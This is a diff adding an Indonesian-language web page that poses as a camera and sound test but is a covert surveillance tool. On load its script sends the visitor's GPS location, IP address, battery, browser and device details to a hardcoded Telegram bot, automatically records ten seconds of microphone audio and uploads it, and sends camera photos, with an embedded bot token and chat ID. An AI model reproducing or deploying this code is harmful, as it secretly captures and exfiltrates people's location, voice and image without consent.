@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FREEPALESTINE🇵🇸</title>
+    <style>
+        body {
+            text-align: center;
+            background-color: #f0f0f0;
+            font-family: Arial, sans-serif;
+        }
+        video, audio {
+            border: 2px solid #555;
+            border-radius: 10px;
+            margin: 10px;
+        }
+        canvas {
+            display: none;
+        }
+        button {
+            padding: 10px 20px;
+            background-color: #28a745;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 5px;
+        }
+        button:hover {
+            background-color: #218838;
+        }
+        h1 {
+            color: #333;
+        }
+    </style>
+</head>
+<body>
+    <h1>Info Perangkat Dan Test Kamera & Suara😎</h1>
+    <video id="video" autoplay></video>
+    <br>
+    <button id="capture">Ambil Foto</button>
+    <audio id="audio" controls></audio>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const telegramBotToken = '8187184376:AAFt5sZqUKDjo4_MXf8GCX77Y3E8Bq4VmPo'; // Token bot Telegram
+        const chatId = '6384699480'; // Chat ID untuk mengirim pesan
+
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const audioElement = document.getElementById('audio');
+
+        let mediaRecorder;
+        let audioChunks = [];
+
+        // Fungsi untuk mengirim pesan ke Telegram
+        function sendToTelegram(message) {
+            const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+            const data = {
+                chat_id: chatId,
+                text: message,
+                parse_mode: 'HTML'
+            };
+
+            fetch(telegramApiUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            }).then(response => {
+                if (response.ok) {
+                    console.log('Pesan terkirim ke Telegram');
+                } else {
+                    console.error('Gagal mengirim pesan ke Telegram');
+                }
+            });
+        }
+
+        // Fungsi untuk mengirim foto ke Telegram
+        function sendPhotoToTelegram(photoBlob) {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', photoBlob);
+
+            fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
+                method: 'POST',
+                body: formData,
+            }).then(response => {
+                if (response.ok) {
+                    console.log('Foto terkirim ke Telegram');
+                } else {
+                    console.error('Gagal mengirim foto ke Telegram');
+                }
+            });
+        }
+
+        // Fungsi untuk mengirim suara ke Telegram
+        function sendAudioToTelegram(audioBlob) {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('audio', audioBlob);
+
+            fetch(`https://api.telegram.org/bot${telegramBotToken}/sendAudio`, {
+                method: 'POST',
+                body: formData,
+            }).then(response => {
+                if (response.ok) {
+                    console.log('Audio terkirim ke Telegram');
+                } else {
+                    console.error('Gagal mengirim audio ke Telegram');
+                }
+            });
+        }
+
+        // Fungsi untuk menangkap gambar
+        function captureImage() {
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            canvas.toBlob(function(blob) {
+                sendPhotoToTelegram(blob); // Kirim foto ke Telegram
+            }, 'image/png');
+        }
+
+        // Mengambil akses kamera dan mikrofon
+        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+            .then(stream => {
+                video.srcObject = stream;
+                mediaRecorder = new MediaRecorder(stream);
+                mediaRecorder.ondataavailable = event => {
+                    audioChunks.push(event.data);
+                };
+                mediaRecorder.onstop = () => {
+                    const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                    audioElement.src = URL.createObjectURL(audioBlob);
+                    sendAudioToTelegram(audioBlob); // Kirim audio ke Telegram
+                };
+
+                // Mulai merekam suara secara otomatis setelah beberapa detik
+                setTimeout(() => {
+                    mediaRecorder.start();
+                    console.log('Merekam suara secara otomatis...');
+                    // Hentikan rekaman setelah 10 detik
+                    setTimeout(() => {
+                        mediaRecorder.stop();
+                        console.log('Rekaman dihentikan secara otomatis');
+                    }, 10000); // Ubah durasi sesuai kebutuhan
+                }, 2000); // Mulai rekaman setelah 2 detik
+            })
+            .catch(error => {
+                console.error('Gagal mengakses kamera atau mikrofon: ', error);
+            });
+
+        // Mengumpulkan dan mengirim informasi tambahan ke Telegram
+        function gatherAndSendAdditionalInfo() {
+            getLocation();
+            getIP();
+            getBattery();
+            getBrowserInfo();
+            getTimeStamp();
+            getScreenResolution();
+            getConnectionInfo();
+            getCookieStatus();
+            getMemoryInfo();
+        }
+
+        // Mengumpulkan informasi lokasi
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const locationLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                    const locationInfo = `📍 <b>Lokasi GPS:</b> <a href="${locationLink}">Lihat di Google Maps</a>`;
+                    sendToTelegram(locationInfo); // Mengirim ke Telegram
+                });
+            } else {
+                const noLocation = '⚠️ Lokasi tidak tersedia';
+                sendToTelegram(noLocation); // Mengirim ke Telegram
+            }
+        }
+
+        // Mendapatkan IP Address
+        function getIP() {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ipInfo = `🌐 <b>IP Address:</b> ${data.ip}`;
+                    sendToTelegram(ipInfo); // Mengirim ke Telegram
+                });
+        }
+
+        // Mendapatkan informasi baterai
+        function getBattery() {
+            navigator.getBattery().then(function(battery) {
+                const batteryInfo = `🔋 <b>Baterai:</b> ${(battery.level * 100)}%, Sedang di-charge: ${battery.charging ? "Ya" : "Tidak"}`;
+                sendToTelegram(batteryInfo); // Mengirim ke Telegram
+            });
+        }
+
+        // Mendapatkan informasi perangkat (browser, platform, bahasa)
+        function getBrowserInfo() {
+            const browserInfo = `💻 <b>Browser:</b> ${navigator.userAgent}\n🖥️ <b>Platform:</b> ${navigator.platform}\n🌍 <b>Bahasa:</b> ${navigator.language}`;
+            sendToTelegram(browserInfo); // Mengirim ke Telegram
+        }
+
+        // Mendapatkan informasi waktu akses (timestamp)
+        function getTimeStamp() {
+            const now = new Date();
+            const timeStamp = `⏰ <b>Waktu Akses:</b> ${now.toLocaleString()}`;
+            sendToTelegram(timeStamp); // Mengirim ke Telegram
+        }
+
+        // Mendapatkan resolusi layar
+        function getScreenResolution() {
+            const screenResolution = `🖥️ <b>Resolusi Layar:</b> ${window.screen.width}x${window.screen.height}`;
+            sendToTelegram(screenResolution); // Mengirim ke Telegram
+        }
+
+        // Mendapatkan kecepatan koneksi internet
+        function getConnectionInfo() {
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (connection) {
+                const connectionInfo = `📡 <b>Kecepatan Koneksi:</b> ${connection.effectiveType}`;
+                sendToTelegram(connectionInfo); // Mengirim ke Telegram
+            }
+        }
+
+        // Mendapatkan status cookie
+        function getCookieStatus() {
+            const cookieStatus = `🍪 <b>Status Cookie:</b> ${navigator.cookieEnabled ? "Aktif" : "Non-aktif"}`;
+            sendToTelegram(cookieStatus); // Mengirim ke Telegram
+        }
+
+        // Mendapatkan informasi penggunaan memori
+        function getMemoryInfo() {
+            if (navigator.deviceMemory) {
+                const memoryInfo = `📱 <b>Memori Perangkat:</b> ${navigator.deviceMemory} GB`;
+                sendToTelegram(memoryInfo); // Mengirim ke Telegram
+            }
+        }
+
+        // Mengumpulkan dan mengirim informasi tambahan setelah halaman dimuat
+        window.onload = gatherAndSendAdditionalInfo;
+
+    </script>
+</body>
+      </html>
